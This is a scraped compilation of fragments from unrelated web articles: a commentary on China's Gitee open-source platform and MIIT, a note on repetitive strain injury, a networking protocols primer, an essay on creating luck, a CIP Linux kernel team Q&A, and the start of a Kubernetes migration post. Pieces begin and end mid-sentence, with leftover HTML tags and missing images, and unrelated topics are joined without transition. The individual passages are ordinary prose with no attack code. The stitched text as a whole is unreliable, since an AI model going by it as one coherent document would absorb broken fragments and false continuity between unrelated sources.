world. This claim is not that far-fetched considering that China-based developers’ activities on GitHub is the 2nd largest group by a wide margin. If you include Hong Kong-based developers with China, it may be the largest cohort, exceeding that of the United States. It’s likely that a solid proportion of Chinese developers have Gitee accounts, along with GitHub, which would justify Gitee’s 2nd place claim.</p><figure><img src="https://lh6.googleusercontent.com/-ynQ01jyNy-HDfVeglvZXazg4Jg5hbZmuaEJDjVDs18FrLpNTI-Hcx_gkcQFnPbT9uy5Rw1lGUFL3hZMZfW9D7YEzwo-89lwTjDxAtd9F1L81j5B6TftXKLB22I-9sQUMUbbzSoo" alt=""><figcaption>Source GitHub Octoverse 2019: https://octoverse.github.com/</figcaption></figure><p>From the business side, Gitee’s go-to-market approach is a classic enterprise strategy, which is, again, not that different from GitHub, GitLab, or other similar products. It counts Huawei, China Telecom, and a handful of banks as enterprise customers -- all companies with national strategic importance. With MIIT’s official endorsement, Gitee’s enterprise traction within China will grow. That also means it will have no traction outside of China, but doing business globally was never part of Gitee’s ambition, though that contradicts its claimed purpose to foster open source (more on that later).</p><p>When I was writing my 3-part series “<a href="https://interconnected.blog/open-source-in-china-the-players/"><strong>Open Source in China</strong></a>'' in May, I only briefly mentioned Gitee as one of the minor players in the ecosystem. MIIT’s anointment will boost Gitee’s profile and status, because it is now the designated “national champion”. There will be more government support for the platform. The company will get more investment from funds that like to align themselves closely with government initiatives. I can even see a day when Gitee will IPO on the Shanghai STAR exchange, similar to other much bigger “national champions”, like SMIC in the semiconductor industry.</p><p>There are still lots of unknowns to how Gitee will grow as a product. What is clear is that Gitee is <strong>now a “policy-driven” company </strong>that will rely heavily on the government direction-setting and protectionism, quite similar to its investor Baidu. While all current Chinese tech giants have benefited from some level of protectionism in the past, Alibaba, Tencent, Huawei, and now ByteDance have all grown their core technologies and products to a level where they <em>can</em> compete with other global players on those terms alone. Not Baidu. And not Gitee.</p><h2 id="miit-s-role">MIIT’s Role</h2><p>MIIT is the most relevant central government ministry to pay attention to when it comes to China’s technology sector. It has embraced open source in an official policy planning document in 2016, titled: “2016-2020: Development Planning of Software and Information Technology Services Industry” (unofficial translation). This document laid out a few initiatives (more like proclamations) where open source was the centerpiece:</p><blockquote>“...promote the effect that the open source community has to support innovation, strengthen the real-world application of open source technology in innovation, build an open source ecosystem that is advantageous to innovation in an open, collaborative, and global fashion...” (unofficial translation)</blockquote><p>The endorsement of Gitee is the result of an official government project procurement in May that called for proposals of solutions for an “open source hosting platform”. <strong>This is perhaps the first step that MIIT took to concretely involve itself in open source.</strong></p><figure><img src="https://lh3.googleusercontent.com/A1Uco6q0-KGLps5UveY5NjqQwZWAKg73Y_oDF-P5VQslEbAhISsdTrv7VIZnA3kfj17ThFiCvSTT84R5L1UZWSYzr9dzNbGk3PCIEbxwvwWx5NaL5JCFQCZifoZnur8WjF049Q-H" alt=""><figcaption>MIIT official project procurement announcement</figcaption></figure><p>In the end, the group that won the project was a consortium of 10 organizations that included: Huawei, a few technical universities and think tanks, a few other companies, and, of course, OSChina. Thus Gitee.</p><p><strong>Why did Gitee win? It’s really the only game in town.</strong> I highly doubt GitHub or GitLab submitted a proposal.</p><p>If MIIT was simply interested in embracing open source and lending its support to Chinese open source developers where they are working and collaborating now, GitHub would’ve been the obvious choice. On Zhihu, a Quora-like service in China where many developers congregate to discuss technology topics (thus a good proxy for assessing interest level), <strong>more than 84,000 people follow GitHub. Gitee? 243</strong> (at the time of this writing).</p><figure><img src="https://lh6.googleusercontent.com/QVwEbCc5rDm81FVyJuqIqRlycRfAzwSzi2nJcz5lJiZTPNfHxkU4Hy_1AH7aERIVM5RHtVaLql7GRdKen0rle5HjDiZxeiPVY4XUIrAoZ8AHm0bmfU5HvgiR8WIJRAg-Fy4uEXCU" alt=""></figure><figure><img src="https://lh4.googleusercontent.com/BEgC9nm1LSdYZp0EiUgkBsC6wyXjl31tQx-00O45iojWB2UCEe3Sb7eehtF4c5k1UFe7m5UWbPHEFlpuR9eslPp0RlQMQOzQQjoWIvwjGgScjaG0XaJFDhFoHoHsXOyIlhPhaHI8" alt=""></figure><h3 id="how-will-all-this-play-out">How will all this play out?</h3><p>There are not enough details to speculate. As the current four-year planning period ended in 2020, MIIT is likely working on the next four years of planning, where Gitee will play a significant role.</p><p>However, it is likely that any open source project that MIIT or its various sub-bureaus will use in the future will have to be hosted on Gitee. If the project is already on GitHub, the company or team that runs the project will probably have to maintain another copy on Gitee. This requirement may extend to many of the strategic tech sectors that are under MIIT’s jurisdiction.</p><p>All this is done to exert some level of national “control” on the open source technologies that are important to China’s path towards self-reliance, just in case GitHub becomes inaccessible due to more sanctions or policy changes from Washington.</p><p><strong>This fear is not unwarranted. </strong>Right now, GitHub is accessible albeit with performance issues here and there, but no one can guarantee that will continue in this current environment between the US and China. Being a subsidiary of Microsoft, GitHub may also be caught up in the potential Microsoft-TikTok deal in ways that no one can predict.</p><p>There’s a lot to untangle, and the future is murky. Thus, some contingency planning is quite reasonable.</p><p>But is this attempt to “nationalize” open source in China going to work?</p><h2 id="open-source-can-t-be-nationalized-">Open Source Can’t Be “Nationalized”</h2><p>As you might’ve guessed by now, the title of the post is a rhetorical question. You can’t “nationalize” open source.</p><p>But the bigger point is: <strong>it’s dangerous to think you can.</strong></p><p>It’s smart for a government to embrace the innovative energy of open source to boost its own technological advancement. China is doing it. I’ve advocated <a href="https://www.wired.com/story/opinon-the-future-of-american-industry-depends-on-open-source-tech/"><strong>in this Wired opinion piece</strong></a><strong> </strong>that the U.S. should be doing the same.</p><p>But no government can or should try to “nationalize” open source, because it contradicts the very nature and culture of open source that made it the technological force that it is today.</p><p><strong>Eric Raymond</strong>, one of the founding members of the free software and open source movement, wrote a profound essay called “<a href="http://www.catb.org/~esr/writings/cathedral-bazaar/homesteading/ar01s06.html"><strong>The Hacker Milieu as Gift Culture</strong></a>” in the 90s. In it, he explained that <strong>the open source hacker culture is …</strong></p></div></section></article></div></div></div>

It includes a whole spectrum of conditions, from tendonitis of the hand or wrist to carpal tunnel syndrome to cubital tunnel syndrome. Basically, if your hands or wrists hurt or go numb or tingle, that may be RSI. If these symptoms are associated with repetitive tasks, such as typing at a computer, it is almost certainly RSI. (Note that such symptoms do sometimes go away within a few minutes, hours, days, or weeks.) Other symptoms include losing strength or coordination in your hands, or perhaps dropping things.</p> <p>Not everyone experiences all symptoms, and sometimes your symptoms may not occur until several hours or even days after the activity which causes them.

Preface
</summary>

  <p>I wrote this article to introduce the Internet to a non-technical audience.
In order to get everyone on board,
I first explain basic concepts, such as
<a href="#communication-protocol">communication protocols</a>,
<a href="#network-topologies">network topologies</a>,
and <a href="#signal-routing">signal routing</a>.
The section about <a href="#internet-layers">Internet layers</a> becomes increasingly technical
and peaks with a deep dive into <a href="#domain-name-system-security-extensions"><abbr title="Domain Name System Security Extensions">DNSSEC</abbr></a>.
If the beginning is too elementary for you,
then just skip ahead to more interesting sections.</p>

  <p>Due to the nature of the topic,
this article contains a lot of acronyms.
Many of them are <a href="https://en.wikipedia.org/wiki/Three-letter_acronym">three-letter acronyms (<abbr title="Three-Letter Acronym">TLA</abbr>)</a>,
but some are longer,
which makes them extended three-letter acronyms (<abbr title="Extended Three-Letter Acronym">ETLA</abbr>).
While I introduce most of the acronyms before using them,
you can simply hover over a <abbr title="Three-Letter Acronym">TLA</abbr> or an <abbr title="Extended Three-Letter Acronym">ETLA</abbr> with your mouse
if you forgot what they stand for.
If you are reading this on a touch device,
you have to touch the acronym instead.</p>

  <p>Let’s get right into it:
What is a protocol?</p>

</details>

<h2 id="communication-protocol">Communication protocol</h2>

<h3 id="communication-diagram">Communication diagram</h3>

<p>A <a href="https://en.wikipedia.org/wiki/Communication_protocol">communication protocol</a>
specifies how two parties can exchange information for a specific purpose.
In particular, it determines which messages are to be transmitted in what order.
If the two parties are computers,
a formal, well-defined protocol is easiest to implement.
In order to illustrate what is going on, however,
let’s first look at an informal protocol,
also known as <a href="https://en.wikipedia.org/wiki/Etiquette">etiquette</a>,
which we’re all too familiar with:</p>

</figcaption>
</figure>

<p>This is a <a href="https://en.wikipedia.org/wiki/Sequence_diagram">sequence diagram</a>
and it highlights the temporal dimension of a protocol
in which messages are exchanged sequentially.</p>

<h3 id="communication-parties">Communication parties</h3>

<p>It also illustrates that communication is commonly initiated by one party,
whereby the recipient responds to the requests of the initiator.
Please note that this is only the case for one-to-one protocols,
in which each message is intended for a single recipient.</p>

<details>
  <summary id="broadcasting-and-information-security">
Broadcasting and information security
</summary>

  <p>There are also one-to-many protocols for <a href="https://en.wikipedia.org/wiki/Broadcasting">broadcasting</a>.
These are typically one-way protocols,
in which the recipients do not acknowledge the receipt of the transferred data.
Examples for such protocols are analog radio
or churches ringing their bells to indicate the time of day.
Both in the case of a single recipient and in the case of a broad target audience,
anyone with access to the physical medium and the right sensors receives the signal.
The difference is simply that,
in the former case,
entities ignore the messages
which are not addressed to them.
If the messages are not encrypted,
others can still read them, though.
And if the messages are not authenticated,
a malicious party might be able to alter them in transit.
Even when messages are encrypted and authenticated,
their exchange can still be interrupted,
by not relaying some messages
or by <a href="https://en.wikipedia.org/wiki/Radio_jamming">jamming</a> the signal.
The properties Confidentiality, Integrity, and Availability
form the so-called <abbr title="Confidentiality, Integrity, and Availability">CIA</abbr> triad of <a href="https://en.wikipedia.org/wiki/Information_security">information security</a>.</p>

</details>

<h3 id="communication-channel">Communication channel</h3>

<p>The above greeting protocol is used among humans
to establish a <a href="https://en.wikipedia.org/wiki/Communication_channel">communication channel</a> for a longer exchange.
In technical jargon,
such an exchange in preparation for the actual communication is called a <a href="https://en.wikipedia.org/wiki/Handshaking">handshake</a>.
The greeting protocol checks the recipient’s availability and willingness to engage in a conversation.
When talking to someone you have never spoken before,
it also ensures that the recipient understands your language.
I’ve chosen these two examples for their figurative value.
Why we actually <a href="https://en.wikipedia.org/wiki/Greeting">greet</a> each other
is mainly for different reasons:
To show our good intentions by making our presence known to each other,
to signal sympathy and courtesy by asking the superficial question,
and to indicate our relative social status to each other and to bystanders.
Another benefit of asking such a question is that,
even though it’s very shallow,
it makes the responder more likely to do you a favor
due to the psychological effect of
<a href="https://www.influenceatwork.com/principles-of-persuasion/#consistency">commitment and consistency</a>.</p>

<h2 id="handling-of-anomalies">Handling of anomalies</h2>

<h3 id="protocol-deviation">Protocol deviation</h3>

<p>Since your communication partner can be erratic,
a protocol needs to be able to handle deviations:</p>

<p>In order to detect transmission errors,
computers typically append a <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a> to each message,
which the recipient then verifies.
The need to <a href="https://en.wikipedia.org/wiki/Retransmission_(data_networks)">retransmit</a> messages
can be reduced by adding redundancy to messages
so that the recipient can <a href="https://en.wikipedia.org/wiki/Error_detection_and_correction">detect and correct small errors</a> on their own.
A simple and very inefficient way of doing this is to repeat the content within each message several times.</p>

<h3 id="connection-loss">Connection loss</h3>

<p>It can also happen that a party loses their connection permanently,
for example by moving too far away for the signal to reach the recipient.
Since a conversation requires some attention from the communication partner,
abandoning a conversation unilaterally without notifying the other party
can be misused to block them from talking to someone else for some time.
In order to avoid binding resources for a prolonged period of time
and thereby potentially falling victim to a so-called
<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attack</a>,
computers drop connections after a configurable duration of inactivity:</p>

  <figcaption>
Bob’s second message (in blue) arrives after his third message (in green).
</figcaption>
</figure>

<p>The solution for this is to enumerate all messages,
to reorder them on arrival,
and to ask the other party to retransmit any missing messages,
as we saw <a href="#data-corruption">above</a>.</p>

<h3 id="lack-of-interoperability">Lack of interoperability</h3>

<p>Besides defining the <a href="https://en.wikipedia.org/wiki/Syntax">syntax</a> (the format),
the <a href="https://en.wikipedia.org/wiki/Semantics">semantics</a> (the meaning),
and the order of the messages,
a protocol should also specify how to handle anomalies like the above.
Ambiguity in a standard
and willful deviation therefrom
result in incompatibilities between different implementations.
In combination with a lack of established standards in many areas,
which often leads to uncoordinated efforts by various parties,
incompatibilities are quite common in computer systems,
unfortunately.
This causes a lot of frustration for users and programmers,
who have to find workarounds for the encountered limitations,
but this cannot be avoided in a free market of ideas and products.</p>

<h2 id="network-topologies">Network topologies</h2>

<h3 id="communication-network">Communication network</h3>

<p>In practice, there are almost always more than two parties
who want to communicate with each other.
Together with the connections between them,
they form a <a href="https://en.wikipedia.org/wiki/Telecommunications_network">communication network</a>.
For the scope of this article,
we’re only interested in symmetric networks,
where everyone who can receive can also send.
This is not the case for analog radio and television networks,
where signals are broadcasted unidirectionally from the sender to the receivers.
In the case of our symmetric networks,
two entities are part of the same network
if they can communicate with each other.
If they cannot reach each other,
they belong to separate networks.</p>

<h3 id="nodes-and-links">Nodes and links</h3>

<p><a href="https://en.wikipedia.org/wiki/Node_(networking)">Nodes</a> are the entities
that communicate with each other over communication <a href="https://en.wikipedia.org/wiki/Data_link">links</a>.
We can visualize this as follows:</p>

</figure>

<p>The terminology is borrowed from <a href="https://en.wikipedia.org/wiki/Graph_theory">graph theory</a>,
where nodes are also called vertices
and links are also called edges.
The technical term for the structure of a network is <a href="https://en.wikipedia.org/wiki/Network_topology">topology</a>.
Different arrangements of nodes and links lead to different characteristics of the resulting network.</p>

<h3 id="fully-connected-network">Fully connected network</h3>

<p>A network is said to be fully connected
if every node has a direct link to every other node:</p>

A fully connected network with five nodes and ten links.
</figcaption>
</figure>

<p>In graph theory, such a layout is known as a <a href="https://en.wikipedia.org/wiki/Complete_graph">complete graph</a>.
Fully connected networks scale badly
as the number of links grows quadratically with the number of nodes.
You might have encountered the formula for the number of links before:
n × (n – 1) / 2, with n being the number of nodes in the network.
As a consequence, this topology is impractical for larger networks.</p>

<h3 id="star-network">Star network</h3>

<p>The number of links can be reduced considerably by introducing a central node,
which forwards the communication between the other nodes.
In such a star-shaped network,
the number of links scales linearly with the number of nodes.
In other words,
if you double the number of nodes,
you also double the number of links.
In a fully connected network, you would have quadrupled the number …</p></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="sapper"> <div>  <main> <div>  <p>My entire worldview changed when I realized that <strong>luck can be created</strong>.</p> <p>More precisely, you can actively <strong>create optimal conditions for lucky things to happen to you</strong>. The more I looked into this, the more I realized that this is not only <em>not</em> a new insight, but successful people have studied this for <em>decades</em> and I am just late to the party.</p> <p>In this post we'll briefly review the "Literature of Luck", and then I'll end with some personal thoughts on how it could be extended.</p> <section> <h2 id="binary-luck">Binary Luck</h2> <p>Most people have a binary view of luck:</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/kgd335km9x3ujfmhxnz7.png"> </p> <p>This is true enough. Some people are born into privilege, some people just win some literal or figurative lottery or other.</p> <p>The closing question of every episode of Guy Raz's <a href="https://www.npr.org/podcasts/510313/how-i-built-this">How I Built This</a> podcast asks successful people: <em>"How much of your success is due to skill, and how much is due to luck?"</em></p> <p>Those who believe in their own agency answer the former. Others - who've seen people smarter and harder working than them fail - answer the latter. Those who are politically correct cop-out with the half-and-half.</p> <p>It can be comforting to subscribe to the binary luck model. If you just got a bad roll of the dice, there's nothing you could do. Your lack of success is not your fault.</p> <p>But what if I told you <strong>there are people who have skill at creating luck</strong> for themselves?</p> </section> <section> <h2 id="luck-surface-area">Luck Surface Area</h2> <p>Jason Roberts coined the term "<a href="https://www.codusoperandi.com/posts/increasing-your-luck-surface-area">Luck Surface Area</a>", and it was expanded by <a href="https://www.skmurphy.com/blog/2019/04/03/increase-your-luck-surface-area-to-get-more-customers/">Sean Murphy</a> and popularized by <a href="https://www.perell.com/podcast/patrick-mckenzie-internet-famous">Patrick McKenzie</a>.</p> <p>I liken this model of luckiness to a "catchment area" (<a href="https://en.wikipedia.org/wiki/Catchment_area">a term from urban and hydrological geography</a>). Luck is still randomly occurring, but you can position yourself in a way that captures more of it:</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/ogbkk8weenqb9nltrl34.png"> </p> <p>Jason has a really simple model of how to grow your LSA - do more things, and tell more people about it. <strong>Doing and Telling</strong>. Already this embodies a more active attitude toward how you can orient your life for more positive random events. It's "<a href="https://www.brainpickings.org/2014/01/29/carol-dweck-mindset/">Fixed vs Growth mindset</a>" adapted for luck.</p> </section> <section> <h2 id="four-kinds-of-luck">Four Kinds of Luck</h2> <p>A parallel, older school of thought dates back to James Austin in 1978 and was repopularized by <a href="https://pmarchive.com/luck_and_the_entrepreneur.html">Marc Andreesen</a> in 2007, then <a href="https://twitter.com/nivi/status/1094940675353784320?lang=en">Naval and Nivi</a> a decade later.</p> <p>Here, there are no helpful visuals. James Austin just gives a list of types, and Marc quotes verbatim. <a href="https://twitter.com/naval/status/1093981014920052736">Naval summarizes</a> the 4 kinds of luck as such:</p> <blockquote> <ol> <li> <p>Hope luck finds you.</p> </li> <li> <p>Hustle until you stumble into it.</p> </li> <li> <p>Prepare the mind and be sensitive to chances others miss.</p> </li> <li> <p>Become the best at what you do. Refine what you do until this is true. Opportunity will seek you out. Luck becomes your destiny.</p> </li> </ol> </blockquote> <p>I've quoted this many times to friends and always had trouble remembering what the 4 types are. I gave it some thought and visualized/organized it as such:</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/5ycsicfgoxsvxoyys5ip.png"> </p> <ol> <li> <p><strong>🌱 Accidental Luck</strong>: You have the same luck as a plant. A plant does not move. Whether or not a plant does well pretty much just depends on where it's seed lands. It's not very interesting since by definition you can't do anything about it, but ofc privilege plays a huge part.</p> </li> <li> <p><strong>🏃🏽‍♀️ Active Luck</strong>: The luck you get from constantly moving around. There's no particular direction in mind, but you're more likely to find something good if you move around and explore instead of stay put and hope. You're more likely to roll a 6 if you roll more dice.</p> <blockquote> <p>"I have never heard of anyone stumbling on something sitting down." - <a href="https://due.com/blog/keep-going-charles-f-kettering/">Charles Kettering</a></p> </blockquote> </li> <li> <p><strong>💊 Prepared Luck</strong>: The luck you get from noticing that something lucky has happened, that most would miss. The canonical story on this is Alexander Fleming's discovery of penicillin, which was a huge medical breakthrough. The discovery was a total accident (some mold happened to fall in the right spot + Fleming happened to see it + he had a similar experience that was a nonevent 9 years ago), but Fleming was not only "uniquely equipped to observe it" by his background, he took action to confirm the observation.</p> <blockquote> <p>"Luck is what happens when preparation meets opportunity." - Seneca</p> </blockquote> <blockquote> <p>"Chance favors the prepared mind." - Louis Pasteur</p> </blockquote> <blockquote> <p>"Richard Feynman was fond of giving the following advice on how to be a genius. You have to keep a dozen of your favorite problems constantly present in your mind, although by and large they will lay in a dormant state. Every time you hear or read a new trick or a new result, test it against each of your twelve problems to see whether it helps. Every once in a while there will be a hit, and people will say: “How did he do it? He must be a genius!”" - <a href="http://themattheweffect.org/tag/richard-feynman/">Gian-Carlo Rota</a></p> </blockquote> </li> <li> <p><strong>🧲 Magnetic Luck</strong>: <em>"Chance IV comes to you, unsought, because of who you are and how you behave."</em> All sources call it "individualized action" but I've renamed it "magnetic luck" to emphasize the end result rather than how you get there. I'm quite familiar with this as <a href="https://www.swyx.io/writing/learning-gears/#miner">the "Miner" gear of my Learning Gears</a> terminology (since updated to 4 gears in <a href="https://learninpublic.org/">my book</a>). This was already a thing pre-Internet, but search and social media have given tremendous reach and influence to the oddballs and obsessives that become the spiritual leaders of every idea and purpose both big and niche.</p> </li> </ol> <p>I find the 4 of these hard to remember, so I've organized them along two axes - <strong>active vs passive</strong>, and <strong>general vs individual</strong>. The first axis is the same realization as "Luck Surface Area" - you actually have the power to do things to create more luck than you were given.</p> <p>The second axis is the insight - that there are forms of luck that apply to everyone, and there are forms of luck that are available only to someone in your unique position. There is a you-shaped hole in the universe and you can either passively occupy it or you can become a beacon for some idea or purpose.</p> </section> <section> <h2 id="habits-and-strategy">Habits and Strategy</h2> <p>I of course find the Four Kinds of Luck very appealing, since I've quoted it so much to friends that I'm writing this post at all. But upon closer reading I think there's a <em>slightly</em> different direction that is unaddressed by the Four Kinds (I originally thought this was embedded in the Four Kinds, only to discover that it wasn't in the source material and I had completely read my own thinking into it).</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/poue5zg9homy1eo4ml05.png"> </p> <p>This model differs in two ways. It treats both axes as a spectrum rather than a 2x2. It also focuses more on <strong>actions</strong> (you can take) rather than <strong>classification</strong> (which are a little more abstract). I've also swapped out "Active vs Passive" for "Active Habits" and "Individual vs General" for "Good Strategy". So my version is more about HOW you get more lucky. It's not very actionable to be "more magnetic", but you can Claim a Domain or Hustle and have a good sense of what those things entail.</p> <p>I've written about a few of these ideas in prior posts so I won't elaborate:</p> <ul> <li><a href="https://www.swyx.io/writing/marketing-yourself/">Claiming a Domain, Personal Branding</a></li> <li>"Copywork" I wrote about in the "Clone Open Source Apps" chapter of the book</li> </ul> <p>I think <strong>Exploring</strong> and <strong>Prospecting</strong> are worth elaborating here.</p> <p><strong>Exploring</strong> (and to a lesser extent Grinding and Copywork) are <strong>Actively Habitual, non Strategic</strong> activities. But this doesn't mean it is bad. I think this is what you do when you take in general life and career advice and apply them to yourself. You know there are a list of <strong>Principles</strong> which are just generally good things to do in life, and trust that you will do well if you do those things (e.g. <a href="https://www.swyx.io/writing/learn-in-public/">Learn in Public</a>). Keep doing the "right" things, and "trust the process".</p> <p><strong>Prospecting</strong> is a term I've <a href="https://en.wikipedia.org/wiki/Prospecting">borrowed from the oil exploration industry</a>. <strong>Prospecting is a highly Active habit, and highly Strategic.</strong> These days, when you look for oil, there is a whole science to handicapping whether or not a plot of land is likely to have oil. You don't know it for a fact, all you're doing is estimating probabilities. Not to get too tautological, but you will be luckier if you can consistently assess and move towards areas where you are more likely to be "lucky". It might look like luck to others, but the motion and intention you invested to get yourself in a position to be lucky was far from random. I've also written many times about how I think strategic <a href="https://www.google.com/search?&amp;q=swyx.io+%22megatrends%22&amp;oq=swyx.io+%22megatrends%22">manoeuvring for "Megatrends"</a> is a good idea.</p> </section> <section> <h2 id="in-summary">In Summary</h2> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/5075sq79y4pstxpp4pdk.png"> </p> <p>This is the state of my thinking on luck right now. That last bit you just read is pretty fresh, I might come back and change this in a couple years when I have refined my thoughts.

<h4><em>The Civil Infrastructure Platform has several work groups that ensure things keep running. Below is a Q and A with the CIP Kernel Team.&nbsp;</em></h4>



<h4><strong>1. What is CIP Kernel Team (What does this team work on, what issues does it solve)</strong></h4>



<p>While the CIP project aims to establish an open source base layer (OSBL) of industrial grade software to enable the use and implementation of software building blocks for civil infrastructure, CIP Kernel Team is responsible for Linux kernel in OSBL to sustain industrial grade systems or devices during their life cycles.</p>



<figure><img src="https://lh5.googleusercontent.com/fe5AeUVhO7PWJxM2UZPVieCttQPS0w43QU0VjEZeeT7DZdBXJaeeAv96GegIpavWucZDLnn4y1M-EuuHWHCPxeoIFzMfSCohjbLI4nOlA5vU0mRzvl-l_HKZa99fPnhYx_8X0dOb" alt=""></figure>



<h4><strong>2. What is the primary goal of this team?</strong></h4>



<p>The goal of the team is to provide CIP kernels with more than a ten year maintenance period by fixing versions to fulfill the required level of reliability, sustainability, and security.</p>



<h4><strong>3. What is the development principle of CIP?</strong></h4>



<p>CIP adopts the upstream first as our development principle. The “Upstream First” principle allows patch commits only if those patches are already in the upstream. By following this principle, if a desired patch is not in the upstream yet, this patch should be accepted by the upstream at first. Therefore, it may take time to introduce the desired patch to our project.</p>



<p>But, it enables us to share our outputs with the upstream.&nbsp; At the same time, the risk of conflicts can be eliminated.</p>



<p>CIP is aiming to sustain target systems and devices during their life cycles which are very long by their nature. So the Upstream First principle is essential to achieve our goal.&nbsp;</p>



<figure><img src="https://lh5.googleusercontent.com/FTuEv57sb4x25OHLDFmIjrPpsujBx75lTDzEWqKtZfAh7jd6hbWtV2YfKOtA_lehxcH0GfeXLhYwYfzwBX2dGvUrPwAi0CYaJf-yfGwLlLY1-8zFfbfCM8OL5zJBG1ndhz8kaWHJ" alt=""></figure>



<h4><strong>4. What is “Upstream First” for the Kernel Team?</strong></h4>



<p>For the CIP kernel team, upstreams are Linus mainline and LTS. The team collaborates with upstream projects. Before using their outputs, the team upstreams what the team has and doesn’t keep them locally.&nbsp;</p>



<figure><img src="https://lh6.googleusercontent.com/fBd2bEkTS7ESz8wugA2jGFrOH_I5DcIhDTzRsWuvWQlKL9nMyt-rNJqwCpNci5GPiJKm34vguEz8MVGlUtU_TxQ8YBEym78alWC8dRuoz_hpCeMcri5VarFmLCKq_L4gqcaBxyoP" alt=""></figure>



<p>As marked 1, “Contribution” is our first action. Feature upstreaming is done by CIP member developers. On the other hand, the CIP Kernel Team contributes to upstream in a more general manner. The team developed open source tools in order to work on contributions effectively..</p>



<p>As marked 2, “Use” is the second action. The team uses LTS kernels to release CIP SLTS kernels. For those releases, automated testing plays a very important role. Therefore the&nbsp; CIP kernel team is closely working with the CIP testing team.</p>



<p>As marked 3, “Integrate” is the third action. By integrating those SLTS kernels with CIP Core packages and additional packages, industrial systems or devices can be developed and maintained.</p>



<h4><strong>5. How does the team use LTS kernels?</strong></h4>



<p>The team uses LTS for CIP SLTS kernel bases.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="330" src="https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM-1024x330.png" alt="" srcset="https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM-1024x330.png 1024w, https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM-200x65.png 200w, https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM-768x248.png 768w, https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM.png 1296w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>CIP SLTS kernels are based on LTS 4.4 and 4.19. The first releases of SLTS 4.19 and 4.19rt were done in 2019. The team plans to maintain them until 2029 for ten years. The first releases of SLTS 4.4 and 4.4rt were done in 2017, and likewise the team supports them for ten years till 2027.</p>



<p>Both LTS 4.4 and 4.19 are maintained for 6 years by the LTS project. So, the remaining 4 years will be maintained by the CIP Kernel Team.</p>



<figure><img src="https://lh5.googleusercontent.com/vAlgfS_UAjTAwDZpkk6P0GzwpyGS8e6bIljcNqEdqogvIWlHl9dRWyq5iUE2gwZ7FU0APVhbD43AmTaJJGR3erW2PzhSc06-2c0HIa22NoEWv16aMB8zpQN7WdSaREycN50r04NX" alt=""></figure>



<h4><strong>6. How can CIP kernels be used?</strong></h4>



<p>By integrating the SLTS kernels with CIP Core packages and additional packages, industrial systems or devices can be developed.&nbsp;</p>



<p>CIP refers to Debian for userland packages. If you would like to use Debian source packages, you can use Yocto/Poky as a build system.&nbsp;</p>



<p>CIP core packages contain tens of packages which may not be sufficient for the development of end products. So, you can add necessary packages from Debian by writing recipes.</p>



<figure><img src="https://lh6.googleusercontent.com/kS4fbRYqo8H8F6uqIW7AG8NvIoytWhrktJI1ImmHZe0RJe2-igm13JMx_B21YNsKahjDQloBhvgwq26hs6m7LQ5191xLGEuj0z3MEngiU1Bd8lKVfjOlfymMG7ucnMOh94uS6jk_" alt=""></figure>



<h4><strong>7. What has this team accomplished so far?</strong></h4>



<p>Currently SLTS 4.19 is released twice a month and 4.4 is once a month. SLTS 4.19-rt is once a month and 4.4-rt once every two months.</p>



<p>So far the team has steadily released CIP SLTS kernels by following release frequencies below.&nbsp;</p>



<figure><img src="https://lh6.googleusercontent.com/6RCuQ3kVM8YPyMS8VAEca6BvrpOaRatTuvVtrzjK7aZkMXebRPk3HttFO1_C3I5NvNlXQbulBUQRjPVQNya_AfslpvJv0amsLHOQ4mSsHoLkAtNLEecD_mn0qMKxGFcQDqUGNU1D" alt=""></figure>



<p>(as of June 7, 2020)</p>



<h4><strong>8. What are some future goals?</strong></h4>



<p>The team made major releases in 2017 and 2019. So, a major release frequency is once per two years so far. Another two years is going to pass, and Year 2021 is approaching. So, the team started to discuss new SLTS kernels.&nbsp;&nbsp;</p>

            </header>

            <p>There has been a lot of work going on in Core Customer over the last few months to migrate our OIDC/OAuth2 identity service from our tactical container platform to on-premises Kubernetes clusters. I’ve spoken about our homebrew container platform (Corbenetes) before, but here’s the essentials.</p>

<blockquote>
  <p>We built a container platform using Chef and Docker as a stepping stone to Kubernetes. It utilised our existing apps-on-virtual-machines deployment and operational patterns, and so this allowed Software Engineers to develop their applications in a cloud-native manner in a familiar way, and without needing to use the (at the time) brand new Kubernetes platform.</p>

  <p>Now we have a very high level of confidence in said new Kubernetes platform, we are migrating projects over and decommissioning our middle-ground solution.</p>
</blockquote>

<p>The migration actually went a lot smoother than we anticipated, especially seeing as this is the first large-scale service we have built on Kubernetes. One thing we hadn’t initially accounted for was the different ways in which health checks would be used by the underlying platform to detect whether or not traffic should be sent to a specific container. For some context, our current Corbenetes architecture looks similar to the below with one traefik container and two app containers per host (alongside a number of supporting containers for logging and metrics that aren’t shown here).</p>

<p><img src="https://sbg.technology/images/zero-downtime-kubernetes/corbenetes_architecture.png" alt=""></p>

<p>Traefik acts as a proxy, handling both TLS-termination and sending requests to the two backends that are available on the host. The upstream load balancer examines the health endpoints of the applications (via traefik) as well as traefik’s own <code>/ping</code> endpoint. When we do a restart of the application as part of a release, we stop traefik, which allows existing connections to the application to clear down, and takes it out of service in the load balancer so no further requests are sent to this host. Once the applications have finished dealing with their requests, they too are closed down. Because of this, the shutdown of the application itself doesn’t need to be the cleanest, as by the time it receives the shutdown signal there are no requests being served by it.</p>

